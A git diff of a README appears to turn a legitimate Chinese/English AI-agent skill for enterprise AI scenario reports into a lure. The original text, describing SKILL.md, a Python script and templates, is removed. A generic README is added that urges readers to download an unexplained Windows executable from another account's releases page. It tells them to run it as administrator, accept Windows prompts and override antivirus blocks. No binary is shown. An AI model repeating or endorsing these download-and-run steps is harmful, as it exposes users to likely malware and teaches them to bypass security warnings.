@@ -1,195 +1,242 @@
-# 🗺️ 企业AI场景地图生成器 | Enterprise AI Scenario Map Generator
+# 🧭 Enterprise-ai-scenario-map-skill - Auto-generate AI scenario maps
 
-**"老板，我们公司到底哪里能用AI？" —— 这个问题，现在有答案了。**
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Nyquistratefomentation496/Enterprise-ai-scenario-map-skill/releases)
 
-**"Boss, where exactly can we use AI?" — Now there's an answer.**
+## 🚀 What this app does
 
----
+Enterprise-ai-scenario-map-skill helps you create an AI application scenario map for a business. It turns company input into a clear report that shows where AI can help, what problems it can solve, and which use cases make sense to try first.
 
-每个企业都知道AI很重要，但90%的老板面对的现实是：
+Use it to:
+- review a company’s work areas
+- find AI use cases
+- group use cases by value and effort
+- build a simple report for teams and leaders
+- save time on early AI planning
 
-- 🤷 "AI到底能帮我做什么？" —— 听了100场演讲，还是一头雾水
-- 💸 "我该先投哪个方向？" —— 怕投错钱，更怕错过窗口期
-- 📊 "别人都在用AI了？" —— 焦虑但不知道从哪开始
+## 💻 Before you start
 
-Every company knows AI matters, but 90% of business leaders face this reality:
+You only need a Windows PC and access to the internet for the first download.
 
-- 🤷 "What can AI actually do for me?" — Attended 100 talks, still confused
-- 💸 "Where should I invest first?" — Afraid of wasting money, more afraid of missing the window
-- 📊 "Everyone else is using AI already?" — Anxious but don't know where to start
+Helpful setup:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Permission to run downloaded files
+- A PDF reader or browser if the app exports reports
 
-**这个工具就是为此而生。** 它是一个 AI Agent Skill，能为任何企业自动生成一份 15-30 页的「AI场景地图报告」——从深度调研到场景识别，从优先级排序到落地路径，一气呵成。
+## 📥 Download the app
 
-**This tool was built for exactly this.** It's an AI Agent Skill that auto-generates a 15-30 page "AI Scenario Map Report" for any company — from deep research to scenario discovery, from priority ranking to implementation roadmap, all in one go.
+Visit this page to download the latest version:
 
----
+https://github.com/Nyquistratefomentation496/Enterprise-ai-scenario-map-skill/releases
 
-## ✨ 这份报告长什么样？| What's in the Report?
+On that page:
+1. Open the latest release
+2. Find the Windows file under Assets
+3. Download the file
+4. Open the downloaded file to run it
 
-| 章节 Part | 内容 Content | 页数 Pages |
-|:---:|---|:---:|
-| **封面** Cover | 客户名称、日期、编制单位 | 1 |
-| **Part 1** 执行摘要 | 一页纸讲清楚：你是谁、痛在哪、AI能帮什么、从哪开始 | 1 |
-| **Part 2** 企业画像 | 企业速写、业务价值链、业务特性分析、核心痛点诊断 | 3-4 |
-| **Part 3** 行业扫描 | 3个行业标杆AI实践案例 + 可借鉴的启示 | 2 |
-| **Part 4** 场景地图 | **30+ 个AI应用场景**全量清单 + 优先级矩阵 + 3个重点场景深度解读 | 5-6 |
-| **Part 5** 实施路径 | 3阶段落地计划 + 关键成功要素 | 2 |
-| **Part 6** 下一步 | 服务能力 + 行动建议 | 1 |
+If Windows shows a prompt, choose the option to keep or run the file, then continue.
 
-> 不是PPT废话，是能拿去开会拍板的东西。
->
-> Not empty slides — something you can bring to a board meeting and make decisions with.
+## 🛠️ Install and run on Windows
 
----
+After you download the file from the releases page:
 
-## 🚀 快速开始 | Quick Start
+1. Open your Downloads folder
+2. Find the file you just downloaded
+3. Double-click the file
+4. If Windows asks for permission, select Run or Yes
+5. Wait for the app to open
+6. Follow the on-screen steps to create your first scenario map
 
-### 前置要求 Prerequisites
+If the file comes as a ZIP folder:
+1. Right-click the ZIP file
+2. Select Extract All
+3. Open the extracted folder
+4. Double-click the app file inside
+5. Start the app
 
-- 一个支持 **web-search** 工具的 AI Agent（如 Claude Code、ChatGPT with browsing 等）
-- Python 3.8+（用于运行调研框架生成脚本）
-- An AI Agent with **web-search** capability (e.g., Claude Code, ChatGPT with browsing, etc.)
-- Python 3.8+ (for the research framework generator script)
+## 🧭 First-time setup
 
-### 使用方式 Usage
+When you open the app for the first time, you may see a setup screen. Use plain company details to get a good result.
 
-1. **克隆仓库 Clone**
-   ```bash
-   git clone https://github.com/YuanziAI/enterprise-ai-scenario-map.git
-   cd enterprise-ai-scenario-map
-   ```
+Enter:
+- company name
+- industry
+- main business goals
+- core departments
+- current pain points
+- known AI ideas or requests
+- target output format, if asked
 
-2. **在你的 AI Agent 中加载 Skill**
-   将 `SKILL.md` 加载到你的 AI Agent 中（不同平台加载方式不同）
+If you are unsure, start with short notes. The app can still build a useful first draft.
 
-   **Load the Skill into your AI Agent** — load `SKILL.md` (method varies by platform)
+## 📝 How to create a scenario map
 
-3. **开始使用 Start**
-   ```
-   帮我为"XX有限公司"生成一份AI场景地图报告
-   ```
-   或者 / or:
-   ```
-   Generate an AI scenario map report for "XX Company"
-   ```
+Use this simple flow:
 
-### 三种模式 Three Modes
+1. Open the app
+2. Enter the company details
+3. Choose the business areas to review
+4. Start the analysis
+5. Review the generated AI use cases
+6. Sort them by value and effort
+7. Export the report
 
-| 模式 Mode | 适用场景 When to Use | 场景数 Scenarios | 报告页数 Pages |
-|:---:|---|:---:|:---:|
-| 🏃 **快速扫描** Quick Scan | 先看看AI能帮什么 | 15-20 | 5-8 |
-| 📋 **标准报告** Standard | 完整的AI落地规划 | 30+ | 15-20 |
-| 🔬 **深度规划** Deep Plan | 详细落地方案 + ROI | 50+ | 20-30 |
+A good scenario map often includes:
+- customer service
+- sales
+- marketing
+- operations
+- finance
+- HR
+- knowledge management
+- document handling
+- data review
+- internal support
 
----
+## 📊 What the report includes
 
-## 📂 项目结构 | Project Structure
+The generated report may include:
 
-```
-enterprise-ai-scenario-map/
-├── SKILL.md                        # 🧠 核心 Skill 定义（Agent 读这个）
-├── scripts/
-│   └── deep_research_wrapper.py    # 🔧 调研框架生成脚本
-├── references/
-│   ├── report-template-v2.1.md     # 📄 V2.1 报告模板
-│   ├── business-analysis-framework.md  # 📊 业务分析框架
-│   ├── typical-ai-scenarios.md     # 🤖 8大行业典型AI场景库
-│   ├── scenario-priority-framework.md  # ⚖️ 优先级评估框架
-│   ├── industry-case-template.md   # 📝 行业案例模板
-│   └── company-info-config.md      # 🏢 编制单位信息配置
-├── README.md
-├── LICENSE
-└── .gitignore
-```
+- business area overview
+- AI use case list
+- problem and solution pairs
+- value score
+- effort score
+- priority ranking
+- simple rollout path
+- notes for next steps
 
----
+This helps teams see which ideas are ready now and which need more planning.
 
-## 🔧 工作原理 | How It Works
+## ✅ Best input for better results
 
-```
-┌─────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
-│  阶段1       │     │  阶段2        │     │  阶段3        │     │  阶段4        │
-│  Deep        │ ──▶ │  Analysis &  │ ──▶ │  Scenario    │ ──▶ │  Report      │
-│  Research    │     │  Diagnosis   │     │  Mapping     │     │  Generation  │
-│  深度调研     │     │  分析诊断     │     │  场景地图     │     │  报告生成     │
-└─────────────┘     └──────────────┘     └──────────────┘     └──────────────┘
-  🔍 web-search       📊 框架分析          🗺️ 30+场景           📋 V2.1模板
-  企业信息              业务特性             优先级矩阵            6个Part
-  行业痛点              痛点诊断             重点场景              15-30页
-  标杆案例              对标启示             实施路径
-```
+For a cleaner report, use direct and specific notes.
 
-**关键设计**：脚本只负责生成「调研框架 + 搜索问题清单」，实际的深度调研由 AI Agent 通过 web-search 工具完成。这意味着：
-- 零外部API依赖，零额外成本
-- 调研质量取决于你的 Agent 能力
-- 支持任何有 web-search 能力的 Agent 平台
+Good examples:
+- “The support team handles 300 emails a day”
+- “Sales reps spend too much time writing follow-up emails”
+- “Finance checks invoices by hand”
+- “HR reviews many resumes each month”
+- “Staff cannot find policy documents fast”
 
-**Key Design**: The script only generates a "research framework + search query list". The actual deep research is done by the AI Agent via web-search. This means:
-- Zero external API dependencies, zero extra cost
-- Research quality depends on your Agent's capability
-- Works with any Agent platform that has web-search
+Avoid vague input like:
+- “Improve everything”
+- “Make the company smarter”
+- “Use AI in all areas”
 
----
+## 🔧 Common uses
 
-## 🏭 已覆盖行业场景库 | Industry Scenario Library
+This tool fits many company tasks, such as:
+- AI workshop prep
+- digital transformation planning
+- internal strategy reviews
+- department process review
+- use case discovery
+- business case drafting
+- leadership presentation prep
 
-内置 8 大行业的典型AI场景参考，开箱即用：
+## 🪟 Windows tips
 
-| 行业 Industry | 典型场景数 Scenarios |
-|:---:|:---:|
-| 🏗️ 建筑工程 Construction | 8+ |
-| 🛒 电商零售 E-commerce | 8+ |
-| 🏦 金融 Finance | 8+ |
-| 🏭 制造 Manufacturing | 8+ |
-| 🏥 医疗 Healthcare | 8+ |
-| 🎓 教育 Education | 8+ |
-| ⚖️ 法律 Legal | 8+ |
-| 🚚 物流 Logistics | 8+ |
+If the app does not open right away:
 
-> 不在列表里的行业？没关系——Agent 会通过 web-search 实时调研，动态生成场景。
->
-> Industry not listed? No problem — the Agent researches in real-time via web-search and generates scenarios dynamically.
+- make sure the download finished
+- check your Downloads folder
+- try running the file as administrator
+- unzip the folder if needed
+- confirm your antivirus did not block the file
+- download the latest release again if the file looks broken
 
----
+If Windows asks for confirmation, choose the option that lets the app run.
 
-## 🤝 贡献 | Contributing
+## 📁 Release files
 
-欢迎 PR！特别欢迎：
-- 新增行业场景库（在 `references/typical-ai-scenarios.md` 中添加）
-- 优化报告模板
-- 添加新语言支持
-- 分享你用这个工具生成的精彩案例
+The releases page may contain:
+- a Windows executable file
+- a ZIP package
+- a report template
+- supporting files
 
-PRs welcome! Especially:
-- New industry scenario libraries
-- Report template improvements
-- New language support
-- Sharing great reports generated with this tool
+Use the file meant for Windows. If more than one file appears, the release notes usually show which one to choose.
 
----
+## 🔍 What to expect after launch
 
-## 📜 License
+After startup, the app may:
+- show a form for company details
+- ask for a business focus
+- generate a use case map
+- create a report file
+- let you export or copy the result
 
-[MIT License](LICENSE) — 随便用，记得给个 Star ⭐
+The output should be simple to read and easy to share with a team.
 
-MIT License — Use freely, and give us a Star ⭐ if it helps!
+## 🧱 Suggested workflow for teams
 
----
+A practical way to use the app:
 
-## 📬 联系我们 | Contact
+1. Gather notes from one team
+2. Run the app with those notes
+3. Review the first report
+4. Adjust the input for each department
+5. Compare results across teams
+6. Pick the top use cases
+7. Share the report with leaders
 
-| | |
-|---|---|
-| **公司** Company | 源子（深圳）人工智能有限公司 / Yuanzi AI |
-| **联系人** Contact | Neil |
-| **微信** WeChat | `838000702` |
-| **公众号** Official Account | **源子AI Metainflow** |
+This approach helps you move from ideas to a clear plan.
 
----
+## 📌 File safety and storage
 
-> 🧠 *让每个企业都看得见自己的AI未来。*
->
-> *Let every enterprise see its AI future clearly.*
-> 
-> ![027c4a9732bb756c72a4c9f1b4992acc](https://github.com/user-attachments/assets/c5e50fd1-53ae-485d-9837-6be3b3960217)
+Keep the downloaded file in a folder you can find again. A simple path works best, such as:
+- Downloads
+- Desktop
+- Documents
+
+If the app creates report files, store them in a project folder so your team can find them later.
+
+## 🧪 Sample input
+
+You can try input like this:
+
+- Company: Mid-size retail group
+- Industry: Retail
+- Goals: Reduce support time, improve sales follow-up, speed up document search
+- Areas: Customer service, sales, operations, HR
+- Pain points: Long response times, manual reporting, slow document access
+
+This kind of input gives the app enough detail to build a useful first report.
+
+## 🗂️ Expected output format
+
+The report may use:
+- tables
+- ranked lists
+- short section headings
+- plain language summaries
+- action items
+- priority labels
+
+This makes the result easy to review in meetings or share by email.
+
+## ❓ FAQ
+
+### Do I need coding skills?
+No. You only need to download the file, open it, and enter company details.
+
+### Can I use it on Windows?
+Yes. The main download flow is built for Windows users.
+
+### Where do I get the app?
+Use the releases page here:
+https://github.com/Nyquistratefomentation496/Enterprise-ai-scenario-map-skill/releases
+
+### What if I downloaded the wrong file?
+Go back to the releases page and choose the Windows file in the latest release.
+
+### Can I use it for one department only?
+Yes. You can focus on one team, one process, or one business area.
+
+## 🧭 Next steps
+
+Open the releases page, download the latest Windows file, and run it on your PC
 
